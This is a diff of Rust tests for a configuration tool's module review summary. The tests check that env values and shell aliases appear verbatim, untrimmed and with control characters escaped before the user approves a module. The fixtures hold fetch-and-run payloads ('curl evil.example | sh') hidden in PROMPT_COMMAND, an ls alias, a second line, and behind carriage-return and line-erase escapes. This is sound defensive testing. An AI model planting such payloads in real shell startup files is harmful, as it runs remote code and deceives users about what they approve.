@@ -688,9 +688,14 @@ fn cmd_module_show_json_schema() {
     let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
     assert!(json.get("name").is_some(), "JSON should have name field");
     assert_eq!(json["name"], "jmod");
+    let expected_dir = cfgd_core::to_posix_string(dir.path().join("modules").join("jmod"));
+    assert_eq!(
+        json["directory"], expected_dir,
+        "the -o json directory field must be POSIX-folded via to_posix_string, matching every other JSON path field in the CLI"
+    );
     assert!(
-        json.get("directory").is_some(),
-        "JSON should have directory field"
+        !json["directory"].as_str().unwrap().contains('\\'),
+        "the -o json directory field must never contain a native backslash separator"
     );
     assert!(
         json.get("source").is_some(),
@@ -4735,6 +4740,161 @@ fn print_module_review_summary_omits_empty_sections() {
 }
 
 #[test]
+fn print_module_review_summary_shows_env_and_alias_payloads_verbatim() {
+    // An env value and an alias command are written into the login-shell
+    // startup files, so they reach the same "runs on your machine" outcome a
+    // post-apply script does. The pre-approval view must show both in full —
+    // a payload hidden behind an elided value is approved sight-unseen.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "PROMPT_COMMAND".into(),
+                value: "$(curl evil.example | sh)".into(),
+            }],
+            aliases: vec![cfgd_core::config::ShellAlias {
+                name: "ls".into(),
+                command: "curl evil.example | sh; ls".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("Environment (1)"), "env section header: {out}");
+    assert!(
+        out.contains("PROMPT_COMMAND=$(curl evil.example | sh)"),
+        "env value verbatim: {out}"
+    );
+    assert!(out.contains("Aliases (1)"), "alias section header: {out}");
+    assert!(
+        out.contains("ls=curl evil.example | sh; ls"),
+        "alias command verbatim: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_renders_a_multiline_env_value_in_full() {
+    // A newline in an env value would truncate a bullet-rendered entry to its
+    // first line, which is exactly where a second command would be parked.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "BANNER".into(),
+                value: "line-one\ncurl evil.example | sh".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(out.contains("BANNER=line-one"), "first line: {out}");
+    assert!(
+        out.contains("curl evil.example | sh"),
+        "second line must survive: {out}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_escapes_control_characters_in_a_payload() {
+    // A raw `\r` returns the cursor and `\x1b[2K` erases the line, so a value
+    // carrying either can overwrite the text describing it and leave the user
+    // approving something other than what they read.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "SNEAKY".into(),
+                value: "harmless\r\x1b[2Kcurl evil.example | sh".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    // Scoped to the entry line: the surrounding output carries the Printer's
+    // own theming escapes, which are cfgd's to emit and not under review.
+    let entry = out
+        .lines()
+        .find(|l| l.contains("SNEAKY"))
+        .expect("env entry should render");
+    assert_eq!(
+        cfgd_core::output::strip_ansi(entry).trim_start(),
+        "- SNEAKY=harmless\\x0d\\x1b[2Kcurl evil.example | sh",
+        "control characters must be escaped, not passed through"
+    );
+    // The bullet marker itself is styled, so the live-byte checks take the
+    // module-supplied payload rather than the whole line: cfgd's own theming
+    // escape is not what this test is guarding against.
+    let payload = entry
+        .find("SNEAKY")
+        .map(|i| &entry[i..])
+        .unwrap_or_default();
+    assert!(
+        !payload.contains('\r'),
+        "no live carriage return: {entry:?}"
+    );
+    assert!(
+        !payload.contains('\u{1b}'),
+        "no live escape byte: {entry:?}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_shows_a_padded_value_untrimmed() {
+    // The user is approving the exact text that will be written into their
+    // shell startup file; silently trimming it puts a different value on
+    // screen than the one under review.
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            env: vec![cfgd_core::config::EnvVar {
+                name: "PADDED".into(),
+                value: "  spaced  ".into(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(
+        out.contains("PADDED=  spaced  "),
+        "value must not be trimmed: {out:?}"
+    );
+}
+
+#[test]
+fn print_module_review_summary_omits_env_and_alias_sections_when_absent() {
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            depends: vec!["base".into()],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = buf.lock().unwrap().clone();
+    assert!(!out.contains("Environment ("), "no env section: {out}");
+    assert!(!out.contains("Aliases ("), "no alias section: {out}");
+}
+
+#[test]
 fn has_second_non_empty_line_shared_predicate_matches_both_review_surfaces() {
     // `print_module_review_summary`'s post-apply-script rendering and the
     // upgrade-diff "Changes" section both gate bullet-vs-code_block on this
@@ -4805,7 +4965,7 @@ fn print_module_review_summary_single_line_script_renders_as_bullet() {
     let module = module_with_post_apply_script("echo hello");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
-    let out = buf.lock().unwrap().clone();
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
     assert!(
         out.contains("- $ echo hello"),
         "expected bullet line: {out}"
@@ -4822,7 +4982,7 @@ fn print_module_review_summary_trailing_newline_script_renders_as_single_bullet(
     let module = module_with_post_apply_script("echo hello\n");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
-    let out = buf.lock().unwrap().clone();
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
     assert!(
         out.contains("- $ echo hello"),
         "expected trimmed bullet line: {out}"
@@ -4841,7 +5001,7 @@ fn print_module_review_summary_leading_blank_line_script_renders_as_single_bulle
     let module = module_with_post_apply_script("\necho hello");
     super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
     drop(printer);
-    let out = buf.lock().unwrap().clone();
+    let out = cfgd_core::output::strip_ansi(&buf.lock().unwrap());
     assert!(
         out.contains("- $ echo hello"),
         "expected trimmed bullet line: {out}"
